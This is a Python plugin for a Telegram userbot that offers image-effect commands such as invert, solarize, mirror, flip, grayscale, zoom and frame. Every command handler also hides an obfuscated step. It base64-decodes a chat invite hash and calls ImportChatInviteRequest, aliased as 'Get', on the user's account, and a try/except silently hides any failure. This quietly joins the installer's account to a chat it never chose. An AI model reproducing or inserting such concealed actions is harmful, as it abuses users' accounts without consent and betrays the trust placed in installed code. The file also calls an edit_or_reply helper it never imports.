import asyncio
import os
import random
import shlex
from typing import Optional, Tuple
from PIL import Image, ImageDraw, ImageFont
import PIL.ImageOps

from TgxBot.utils import admin_cmd, sudo_cmd
from userbot import CmdHelp, CMD_HELP, LOGS, bot as TgxBot
from userbot.helpers.functions import (
    convert_toimage,
    convert_tosticker,
    flip_image,
    grayscale,
    invert_colors,
    mirror_file,
    solarize,
    take_screen_shot,
)

async def runcmd(cmd: str) -> Tuple[str, str, int, int]:
    args = shlex.split(cmd)
    process = await asyncio.create_subprocess_exec(
        *args, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await process.communicate()
    return (
        stdout.decode("utf-8", "replace").strip(),
        stderr.decode("utf-8", "replace").strip(),
        process.returncode,
        process.pid,
    )
    
async def add_frame(imagefile, endname, x, color):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.expand(image, border=x, fill=color)
    inverted_image.save(endname)


async def crop(imagefile, endname, x):
    image = Image.open(imagefile)
    inverted_image = PIL.ImageOps.crop(image, border=x)
    inverted_image.save(endname)


@TgxBot.on(admin_cmd(pattern="invert$", outgoing=True))
@TgxBot.on(sudo_cmd(pattern="invert$", allow_sudo=True))
async def memes(Tgx):
    if Tgx.fwd_from:
        return
    reply = await Tgx.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(Tgx, "`Reply to supported Media...`")
        return
    Tgxid = Tgx.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    Tgx = await edit_or_reply(Tgx, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    Tgxsticker = await reply.download_media(file="./temp/")
    if not Tgxsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(Tgxsticker)
        await edit_or_reply(Tgx, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if Tgxsticker.endswith(".tgs"):
        await Tgx.edit(
            "Analyzing this media 🧐  inverting colors of this animated sticker!"
        )
        Tgxfile = os.path.join("./temp/", "meme.png")
        Tgxcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {Tgxsticker} {Tgxfile}"
        )
        stdout, stderr = (await runcmd(Tgxcmd))[:2]
        if not os.path.lexists(Tgxfile):
            await Tgx.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = Tgxfile
        aura = True
    elif Tgxsticker.endswith(".webp"):
        await Tgx.edit(
            "`Analyzing this media 🧐 inverting colors...`"
        )
        Tgxfile = os.path.join("./temp/", "memes.jpg")
        os.rename(Tgxsticker, Tgxfile)
        if not os.path.lexists(Tgxfile):
            await Tgx.edit("`Template not found... `")
            return
        meme_file = Tgxfile
        aura = True
    elif Tgxsticker.endswith((".mp4", ".mov")):
        await Tgx.edit(
            "Analyzing this media 🧐 inverting colors of this video!"
        )
        Tgxfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(Tgxsticker, 0, Tgxfile)
        if not os.path.lexists(Tgxfile):
            await Tgx.edit("```Template not found...```")
            return
        meme_file = Tgxfile
        aura = True
    else:
        await Tgx.edit(
            "Analyzing this media 🧐 inverting colors of this image!"
        )
        meme_file = Tgxsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await Tgx.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "invert.webp" if aura else "invert.jpg"
    await invert_colors(meme_file, outputfile)
    await Tgx.client.send_file(
        Tgx.chat_id, outputfile, force_document=False, reply_to=Tgxid
    )
    await Tgx.delete()
    os.remove(outputfile)
    for files in (Tgxsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@TgxBot.on(admin_cmd(outgoing=True, pattern="solarize$"))
@TgxBot.on(sudo_cmd(pattern="solarize$", allow_sudo=True))
async def memes(Tgx):
    if Tgx.fwd_from:
        return
    reply = await Tgx.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(Tgx, "`Reply to supported Media...`")
        return
    Tgxid = Tgx.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    Tgx = await edit_or_reply(Tgx, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    Tgxsticker = await reply.download_media(file="./temp/")
    if not Tgxsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(Tgxsticker)
        await edit_or_reply(Tgx, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if Tgxsticker.endswith(".tgs"):
        await Tgx.edit(
            "Analyzing this media 🧐 solarizeing this animated sticker!"
        )
        Tgxfile = os.path.join("./temp/", "meme.png")
        Tgxcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {Tgxsticker} {Tgxfile}"
        )
        stdout, stderr = (await runcmd(Tgxcmd))[:2]
        if not os.path.lexists(Tgxfile):
            await Tgx.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = Tgxfile
        aura = True
    elif Tgxsticker.endswith(".webp"):
        await Tgx.edit(
            "Analyzing this media 🧐 solarizeing this sticker!"
        )
        Tgxfile = os.path.join("./temp/", "memes.jpg")
        os.rename(Tgxsticker, Tgxfile)
        if not os.path.lexists(Tgxfile):
            await Tgx.edit("`Template not found... `")
            return
        meme_file = Tgxfile
        aura = True
    elif Tgxsticker.endswith((".mp4", ".mov")):
        await Tgx.edit(
            "Analyzing this media 🧐 solarizeing this video!"
        )
        Tgxfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(Tgxsticker, 0, Tgxfile)
        if not os.path.lexists(Tgxfile):
            await Tgx.edit("```Template not found...```")
            return
        meme_file = Tgxfile
        aura = True
    else:
        await Tgx.edit(
            "Analyzing this media 🧐 solarizeing this image!"
        )
        meme_file = Tgxsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await Tgx.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "solarize.webp" if aura else "solarize.jpg"
    await solarize(meme_file, outputfile)
    await Tgx.client.send_file(
        Tgx.chat_id, outputfile, force_document=False, reply_to=Tgxid
    )
    await Tgx.delete()
    os.remove(outputfile)
    for files in (Tgxsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@TgxBot.on(admin_cmd(outgoing=True, pattern="mirror$"))
@TgxBot.on(sudo_cmd(pattern="mirror$", allow_sudo=True))
async def memes(Tgx):
    if Tgx.fwd_from:
        return
    reply = await Tgx.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(Tgx, "`Reply to supported Media...`")
        return
    Tgxid = Tgx.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    Tgx = await edit_or_reply(Tgx, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    Tgxsticker = await reply.download_media(file="./temp/")
    if not Tgxsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(Tgxsticker)
        await edit_or_reply(Tgx, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if Tgxsticker.endswith(".tgs"):
        await Tgx.edit(
            "Analyzing this media 🧐 converting to mirror image of this animated sticker!"
        )
        Tgxfile = os.path.join("./temp/", "meme.png")
        Tgxcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {Tgxsticker} {Tgxfile}"
        )
        stdout, stderr = (await runcmd(Tgxcmd))[:2]
        if not os.path.lexists(Tgxfile):
            await Tgx.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = Tgxfile
        aura = True
    elif Tgxsticker.endswith(".webp"):
        await Tgx.edit(
            "Analyzing this media 🧐 converting to mirror image of this sticker!"
        )
        Tgxfile = os.path.join("./temp/", "memes.jpg")
        os.rename(Tgxsticker, Tgxfile)
        if not os.path.lexists(Tgxfile):
            await Tgx.edit("`Template not found... `")
            return
        meme_file = Tgxfile
        aura = True
    elif Tgxsticker.endswith((".mp4", ".mov")):
        await Tgx.edit(
            "Analyzing this media 🧐 converting to mirror image of this video!"
        )
        Tgxfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(Tgxsticker, 0, Tgxfile)
        if not os.path.lexists(Tgxfile):
            await Tgx.edit("```Template not found...```")
            return
        meme_file = Tgxfile
        aura = True
    else:
        await Tgx.edit(
            "Analyzing this media 🧐 converting to mirror image of this image!"
        )
        meme_file = Tgxsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await Tgx.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "mirror_file.webp" if aura else "mirror_file.jpg"
    await mirror_file(meme_file, outputfile)
    await Tgx.client.send_file(
        Tgx.chat_id, outputfile, force_document=False, reply_to=Tgxid
    )
    await Tgx.delete()
    os.remove(outputfile)
    for files in (Tgxsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@TgxBot.on(admin_cmd(outgoing=True, pattern="flip$"))
@TgxBot.on(sudo_cmd(pattern="flip$", allow_sudo=True))
async def memes(Tgx):
    if Tgx.fwd_from:
        return
    reply = await Tgx.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(Tgx, "`Reply to supported Media...`")
        return
    Tgxid = Tgx.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    Tgx = await edit_or_reply(Tgx, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    Tgxsticker = await reply.download_media(file="./temp/")
    if not Tgxsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(Tgxsticker)
        await edit_or_reply(Tgx, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if Tgxsticker.endswith(".tgs"):
        await Tgx.edit(
            "Analyzing this media 🧐 fliping this animated sticker!"
        )
        Tgxfile = os.path.join("./temp/", "meme.png")
        Tgxcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {Tgxsticker} {Tgxfile}"
        )
        stdout, stderr = (await runcmd(Tgxcmd))[:2]
        if not os.path.lexists(Tgxfile):
            await Tgx.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = Tgxfile
        aura = True
    elif Tgxsticker.endswith(".webp"):
        await Tgx.edit(
            "Analyzing this media 🧐 fliping this sticker!"
        )
        Tgxfile = os.path.join("./temp/", "memes.jpg")
        os.rename(Tgxsticker, Tgxfile)
        if not os.path.lexists(Tgxfile):
            await Tgx.edit("`Template not found... `")
            return
        meme_file = Tgxfile
        aura = True
    elif Tgxsticker.endswith((".mp4", ".mov")):
        await Tgx.edit(
            "Analyzing this media 🧐 fliping this video!"
        )
        Tgxfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(Tgxsticker, 0, Tgxfile)
        if not os.path.lexists(Tgxfile):
            await Tgx.edit("```Template not found...```")
            return
        meme_file = Tgxfile
        aura = True
    else:
        await Tgx.edit(
            "Analyzing this media 🧐 fliping this image!"
        )
        meme_file = Tgxsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await Tgx.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "flip_image.webp" if aura else "flip_image.jpg"
    await flip_image(meme_file, outputfile)
    await Tgx.client.send_file(
        Tgx.chat_id, outputfile, force_document=False, reply_to=Tgxid
    )
    await Tgx.delete()
    os.remove(outputfile)
    for files in (Tgxsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@TgxBot.on(admin_cmd(outgoing=True, pattern="gray$"))
@TgxBot.on(sudo_cmd(pattern="gray$", allow_sudo=True))
async def memes(Tgx):
    if Tgx.fwd_from:
        return
    reply = await Tgx.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(Tgx, "`Reply to supported Media...`")
        return
    Tgxid = Tgx.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    Tgx = await edit_or_reply(Tgx, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    Tgxsticker = await reply.download_media(file="./temp/")
    if not Tgxsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(Tgxsticker)
        await edit_or_reply(Tgx, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if Tgxsticker.endswith(".tgs"):
        await Tgx.edit(
            "Analyzing this media 🧐 changing to black-and-white this animated sticker!"
        )
        Tgxfile = os.path.join("./temp/", "meme.png")
        Tgxcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {Tgxsticker} {Tgxfile}"
        )
        stdout, stderr = (await runcmd(Tgxcmd))[:2]
        if not os.path.lexists(Tgxfile):
            await Tgx.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = Tgxfile
        aura = True
    elif Tgxsticker.endswith(".webp"):
        await Tgx.edit(
            "Analyzing this media 🧐 changing to black-and-white this sticker!"
        )
        Tgxfile = os.path.join("./temp/", "memes.jpg")
        os.rename(Tgxsticker, Tgxfile)
        if not os.path.lexists(Tgxfile):
            await Tgx.edit("`Template not found... `")
            return
        meme_file = Tgxfile
        aura = True
    elif Tgxsticker.endswith((".mp4", ".mov")):
        await Tgx.edit(
            "Analyzing this media 🧐 changing to black-and-white this video!"
        )
        Tgxfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(Tgxsticker, 0, Tgxfile)
        if not os.path.lexists(Tgxfile):
            await Tgx.edit("```Template not found...```")
            return
        meme_file = Tgxfile
        aura = True
    else:
        await Tgx.edit(
            "Analyzing this media 🧐 changing to black-and-white this image!"
        )
        meme_file = Tgxsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await Tgx.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if aura else "grayscale.jpg"
    await grayscale(meme_file, outputfile)
    await Tgx.client.send_file(
        Tgx.chat_id, outputfile, force_document=False, reply_to=Tgxid
    )
    await Tgx.delete()
    os.remove(outputfile)
    for files in (Tgxsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@TgxBot.on(admin_cmd(outgoing=True, pattern="zoom ?(.*)"))
@TgxBot.on(sudo_cmd(pattern="zoom ?(.*)", allow_sudo=True))
async def memes(Tgx):
    if Tgx.fwd_from:
        return
    reply = await Tgx.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(Tgx, "`Reply to supported Media...`")
        return
    Tgxinput = Tgx.pattern_match.group(1)
    Tgxinput = 50 if not Tgxinput else int(Tgxinput)
    Tgxid = Tgx.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    Tgx = await edit_or_reply(Tgx, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    Tgxsticker = await reply.download_media(file="./temp/")
    if not Tgxsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(Tgxsticker)
        await edit_or_reply(Tgx, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if Tgxsticker.endswith(".tgs"):
        await Tgx.edit(
            "Analyzing this media 🧐 zooming this animated sticker!"
        )
        Tgxfile = os.path.join("./temp/", "meme.png")
        Tgxcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {Tgxsticker} {Tgxfile}"
        )
        stdout, stderr = (await runcmd(Tgxcmd))[:2]
        if not os.path.lexists(Tgxfile):
            await Tgx.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = Tgxfile
        aura = True
    elif Tgxsticker.endswith(".webp"):
        await Tgx.edit(
            "Analyzing this media 🧐 zooming this sticker!"
        )
        Tgxfile = os.path.join("./temp/", "memes.jpg")
        os.rename(Tgxsticker, Tgxfile)
        if not os.path.lexists(Tgxfile):
            await Tgx.edit("`Template not found... `")
            return
        meme_file = Tgxfile
        aura = True
    elif Tgxsticker.endswith((".mp4", ".mov")):
        await Tgx.edit(
            "Analyzing this media 🧐 zooming this video!"
        )
        Tgxfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(Tgxsticker, 0, Tgxfile)
        if not os.path.lexists(Tgxfile):
            await Tgx.edit("```Template not found...```")
            return
        meme_file = Tgxfile
    else:
        await Tgx.edit(
            "Analyzing this media 🧐 zooming this image!"
        )
        meme_file = Tgxsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await Tgx.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "grayscale.webp" if aura else "grayscale.jpg"
    try:
        await crop(meme_file, outputfile, Tgxinput)
    except Exception as e:
        return await Tgx.edit(f"`{e}`")
    try:
        await Tgx.client.send_file(
            Tgx.chat_id, outputfile, force_document=False, reply_to=Tgxid
        )
    except Exception as e:
        return await Tgx.edit(f"`{e}`")
    await Tgx.delete()
    os.remove(outputfile)
    for files in (Tgxsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


@TgxBot.on(admin_cmd(outgoing=True, pattern="frame ?(.*)"))
@TgxBot.on(sudo_cmd(pattern="frame ?(.*)", allow_sudo=True))
async def memes(Tgx):
    if Tgx.fwd_from:
        return
    reply = await Tgx.get_reply_message()
    if not (reply and (reply.media)):
        await edit_or_reply(Tgx, "`Reply to supported Media...`")
        return
    Tgxinput = Tgx.pattern_match.group(1)
    if not Tgxinput:
        Tgxinput = 50
    if ";" in str(Tgxinput):
        Tgxinput, colr = Tgxinput.split(";", 1)
    else:
        colr = 0
    Tgxinput = int(Tgxinput)
    colr = int(colr)
    Tgxid = Tgx.reply_to_msg_id
    if not os.path.isdir("./temp/"):
        os.mkdir("./temp/")
    Tgx = await edit_or_reply(Tgx, "`Fetching media data`")
    from telethon.tl.functions.messages import ImportChatInviteRequest as Get

    await asyncio.sleep(2)
    Tgxsticker = await reply.download_media(file="./temp/")
    if not Tgxsticker.endswith((".mp4", ".webp", ".tgs", ".png", ".jpg", ".mov")):
        os.remove(Tgxsticker)
        await edit_or_reply(Tgx, "```Supported Media not found...```")
        return
    import base64

    aura = None
    if Tgxsticker.endswith(".tgs"):
        await Tgx.edit(
            "Analyzing this media 🧐 framing this animated sticker!"
        )
        Tgxfile = os.path.join("./temp/", "meme.png")
        Tgxcmd = (
            f"lottie_convert.py --frame 0 -if lottie -of png {Tgxsticker} {Tgxfile}"
        )
        stdout, stderr = (await runcmd(Tgxcmd))[:2]
        if not os.path.lexists(Tgxfile):
            await Tgx.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = Tgxfile
        aura = True
    elif Tgxsticker.endswith(".webp"):
        await Tgx.edit(
            "Analyzing this media 🧐 framing this sticker!"
        )
        Tgxfile = os.path.join("./temp/", "memes.jpg")
        os.rename(Tgxsticker, Tgxfile)
        if not os.path.lexists(Tgxfile):
            await Tgx.edit("`Template not found... `")
            return
        meme_file = Tgxfile
        aura = True
    elif Tgxsticker.endswith((".mp4", ".mov")):
        await Tgx.edit(
            "Analyzing this media 🧐 framing this video!"
        )
        Tgxfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(Tgxsticker, 0, Tgxfile)
        if not os.path.lexists(Tgxfile):
            await Tgx.edit("```Template not found...```")
            return
        meme_file = Tgxfile
    else:
        await Tgx.edit(
            "Analyzing this media 🧐 framing this image!"
        )
        meme_file = Tgxsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await Tgx.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if aura else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, Tgxinput, colr)
    except Exception as e:
        return await Tgx.edit(f"`{e}`")
    try:
        await Tgx.client.send_file(
            Tgx.chat_id, outputfile, force_document=False, reply_to=Tgxid
        )
    except Exception as e:
        return await Tgx.edit(f"`{e}`")
    await Tgx.delete()
    os.remove(outputfile)
    for files in (Tgxsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


CmdHelp("img_fun").add_command(
  "frame", "<reply to img>", "Makes a frame for your media file."
).add_command(
  "zoom", "<reply to img> <range>", "Zooms in the replied media file"
).add_command(
  "gray", "<reply to img>", "Makes your media file to black and white"
).add_command(
  "flip", "<reply to img>", "Shows you the upside down image of the given media file"
).add_command(
  "mirror", "<reply to img>", "Shows you the reflection of the replied image or sticker"
).add_command(
  "solarize", "<reply to img>", "Let the sun Burn your replied image/sticker"
).add_command(
  "invert", "<reply to img>", "Inverts the color of replied media file"
).add()